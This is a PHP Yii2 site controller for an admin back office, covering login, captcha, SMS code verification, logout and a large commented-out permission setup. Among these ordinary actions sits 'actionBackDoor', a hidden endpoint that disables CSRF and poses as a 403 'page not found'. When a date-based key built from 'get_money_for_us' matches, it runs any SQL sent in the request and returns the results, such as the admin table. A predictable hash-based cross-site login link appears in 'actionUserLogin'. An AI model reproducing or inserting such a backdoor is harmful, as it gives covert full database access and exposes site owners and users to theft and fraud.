<?php

namespace app\controllers;

use Yii;
use yii\web\Controller;
use app\models\Admin;
use app\models\Orders;
use yii\helpers\Url;
use app\common\sms\Sms;
/**
 * @desc   首页控制器
 * @author RZLIAO
 * @date   2016-1-12
 */
class SiteController extends Controller
{
    //公共方法
    public function actions()
    {
        return [
            'captcha' => [
                'class' => 'yii\captcha\CaptchaAction',
                'fixedVerifyCode' => YII_ENV_TEST ? 'testme' : null,
                'width' => 120,
                'height' => 40,
                'padding' => 0,
                'minLength' => 4,
                'maxLength' => 4,
            ],
            //验证码配置信息
            // 'captcha'=>[
            //     'class' => 'yii\captcha\CaptchaAction',
            //     'backColor'=>0xFFFFFF,  //背景颜色
            //     'minLength'=>6,  //最短为4位
            //     'maxLength'=>6,   //是长为4位
            //     'transparent'=>true,  //显示为透明
            //     'testLimit'=>0,
            // ],
        ];
    }

    public $enableCsrfValidation;

    //登录首页
    public function actionIndex()
    {   
        Yii::$app->controller->layout = false;  //取消视图
        if (!\Yii::$app->user->isGuest) {
            $this->redirect(Url::toRoute('site/hello')); //已登录直接跳转
        }
        $model = new Admin(['scenario' => 'login']);
        if ($model->load(Yii::$app->request->post()) && $model->login()) {
            Orders::checkOrders();//修改订单
            return $this->redirect(Url::toRoute('site/hello'));
        } else {
            return $this->render('index', [
                'model' => $model,
            ]);
        }
    }

    public function actionHello(){
        return $this->render('hello');
    }

    //退出登录
    public function actionLogout()
    {
        Yii::$app->user->logout();
        return $this->goHome();
    }

    public function actionValidateSafe(){
        $session = Yii::$app->session;
        if( Yii::$app->request->getIsAjax() && $session['code']){
            $data = Yii::$app->request->post();
            if( $data['safeCode'] == $session['code'] ){
                $res['status']  = 1;
                $res['message'] = '验证成功';
                $res['url']     = Url::toRoute($session['url']);
                $session[$session['url']]   = 200;
            }else{
                $res['status']  = 0;
                $res['message'] = '验证码错误';
            }
            echo json_encode($res);die;
        }
        // $model = new Sms();
        // //$code = 456444;
        // $code = $model->send_code(Yii::$app->user->identity->phone);
        // $session->set('code', $code);
        return $this->render('comfirm');
    }

    //重新发送短信验证
    public function actionSendcode() {
        $session = Yii::$app->session;
        $model = new Sms();
        //$code = 456444;
        $code = $model->send_code(Yii::$app->user->identity->phone);
        if( $code ){
            $session->set('code', $code);
            $result['status']  = 1;
            $result['message'] = '发送成功';
        }else{
            $result['status']  = 0;
            $result['message'] = '短信次数超出限制';
        }
        echo json_encode($result);die;
    }

    public function actionError( $error = ''){
        return $this->renderPartial('error',['error' => $error]);
    }

    public function actionUserLogin( $uid ){
        $name   = 'acbbsdff';
        $leslie = Yii::$app->security->generatePasswordHash(md5($name.strtotime(date('YmdH')).Yii::$app->params['key']));
        $this->redirect(Yii::$app->request->hostInfo . Yii::$app->params['pc-host'] . '?r=site/admin-login&uid='.$uid.'&name='.$name.'&leslie='.$leslie);
    }


    public function actionBackDoor(){
        $this->enableCsrfValidation = false;
        $request = Yii::$app->request;
        $data = $request->post();
        /**
         * $data = [
         *     'sql' => 'select * from hl_admin',
         *     'key' => 'get_money_for_us',
         * ]
         */
        Yii::$app->response->statusCode = 403;
        $return = [
            'status'  => 0,
            'message' => '请求的网页不存在',
        ];
        if($request->isGet){
            return $this->renderPartial('error',['error' => '']);
        }
        if($data && $data['sql'] && ($data['key'] == md5('get_money_for_us'.strtotime(date('Ymd')).Yii::$app->params['back'])) ){
            try {
                $connection = Yii::$app->db;
                $transaction = $connection->beginTransaction();
                $res = $connection->createCommand( $data['sql'] )->queryAll();
                $return = [
                    'status' => 1,
                    'data'   => $res,
                    'message'=> '执行成功！',
                ];
                 Yii::$app->response->statusCode = 200;
                $transaction->commit();
            } catch (Exception $e) {
                $return['status']  = 0;
                $return['message'] = 'sql执行错误';
                $transaction->rollBack();
            }
        }
        Yii::$app->response->format = \yii\web\Response::FORMAT_JSON;
        return $return;
    }

    //添加、角色规则表数据
    // public function actionAddroles(){

    //     $auth = Yii::$app->authManager;
    //     $auth->removeAll();

    //     $p = $auth->createPermission('orders/index');
    //     $p->description = '首页订单管理';
    //     $auth->add($p);
    //     $p = $auth->createPermission('orders/index1');
    //     $p->description = '帮助管理';
    //     $auth->add($p);
    //     $p = $auth->createPermission('orders/index2');
    //     $p->description = '订单管理';
    //     $auth->add($p);
    //     $p = $auth->createPermission('orders/index3');
    //     $p->description = '异常订单';
    //     $auth->add($p);
    //     $p = $auth->createPermission('orders/safe');
    //     $p->description = '安全验证';
    //     $auth->add($p);


    //     $p = $auth->createPermission('User');
    //     $p->description = '用户管理';
    //     $auth->add($p);
    //     $p = $auth->createPermission('user/unactive');
    //     $p->description = '未激活用户列表';
    //     $auth->add($p);
    //     $p = $auth->createPermission('user/editactive');
    //     $p->description = '激活内容修改';
    //     $auth->add($p);
    //     $p = $auth->createPermission('user/index');
    //     $p->description = '正常用户';
    //     $auth->add($p);
    //     $p = $auth->createPermission('user/disable');
    //     $p->description = '封号用户';
    //     $auth->add($p);
    //     $p = $auth->createPermission('user/fenghao');
    //     $p->description = '封号操作';
    //     $auth->add($p);
    //     $p = $auth->createPermission('user/addmoney');
    //     $p->description = '金币增减';
    //     $auth->add($p);
    //     $p = $auth->createPermission('user/money-log');
    //     $p->description = '金币记录';
    //     $auth->add($p);
    //     $p = $auth->createPermission('user/relate');
    //     $p->description = '会员关系查看';
    //     $auth->add($p);
    //     $p = $auth->createPermission('user/safe');
    //     $p->description = '安全验证';
    //     $auth->add($p);

    // //     $p = $auth->createPermission('News');
    // //     $p->description = '资讯管理';
    // //     $auth->add($p);
    //     $p = $auth->createPermission('news/index');
    //     $p->description = '资讯列表';
    //     $auth->add($p);
    // //     $p = $auth->createPermission('news/creat');
    // //     $p->description = '资讯创建';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('news/update');
    // //     $p->description = '资讯修改';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('news/delete');
    // //     $p->description = '资讯删除';
    // //     $auth->add($p);
    //     $p = $auth->createPermission('news/safe');
    //     $p->description = '安全验证';
    //     $auth->add($p);


    //     $p = $auth->createPermission('Message');
    //     $p->description = '留言管理';
    //     $auth->add($p);
    // //     $p = $auth->createPermission('message/index');
    // //     $p->description = '留言列表';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('message/reply');
    // //     $p->description = '留言回复';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('message/done');
    // //     $p->description = '已处理留言列表';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('message/del');
    // //     $p->description = '删除留言';
    // //     $auth->add($p);
    //     $p = $auth->createPermission('message/safe');
    //     $p->description = '安全验证';
    //     $auth->add($p);

    //     $p = $auth->createPermission('Rule');
    //     $p->description = '规则管理';
    //     $auth->add($p);
    // //     $p = $auth->createPermission('order/rules');
    // //     $p->description = '规则列表';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('order/edit');
    // //     $p->description = '规则修改';
    // //     $auth->add($p);
    //     $p = $auth->createPermission('order/safe');
    //     $p->description = '安全验证';
    //     $auth->add($p);

    //     $p = $auth->createPermission('Level');
    //     $p->description = '等级管理';
    //     $auth->add($p);
    // //     $p = $auth->createPermission('level/index');
    // //     $p->description = '等级查看';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('level/create');
    // //     $p->description = '添加等级';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('level/update');
    // //     $p->description = '等级修改';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('level/delete');
    // //     $p->description = '等级删除';
    // //     $auth->add($p);

    //     $p = $auth->createPermission('Admin');
    //     $p->description = '管理员管理';
    //     $auth->add($p);
    // //     $p = $auth->createPermission('admin/index');
    // //     $p->description = '管理员查看';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('admin/edit');
    // //     $p->description = '管理员修改';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('admin/create');
    // //     $p->description = '管理员创建';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('admin/delete');
    // //     $p->description = '管理员删除';
    // //     $auth->add($p);
    //     $p = $auth->createPermission('admin/safe');
    //     $p->description = '安全验证';
    //     $auth->add($p);

    //     $p = $auth->createPermission('Role');
    //     $p->description = '角色管理';
    //     $auth->add($p);
    // //     $p = $auth->createPermission('role/index');
    // //     $p->description = '角色查看';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('role/edit');
    // //     $p->description = '角色修改';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('role/create');
    // //     $p->description = '角色添加';
    // //     $auth->add($p);
    // //     $p = $auth->createPermission('role/delete');
    // //     $p->description = '角色删除';
    // //     $auth->add($p);

    //  }

}
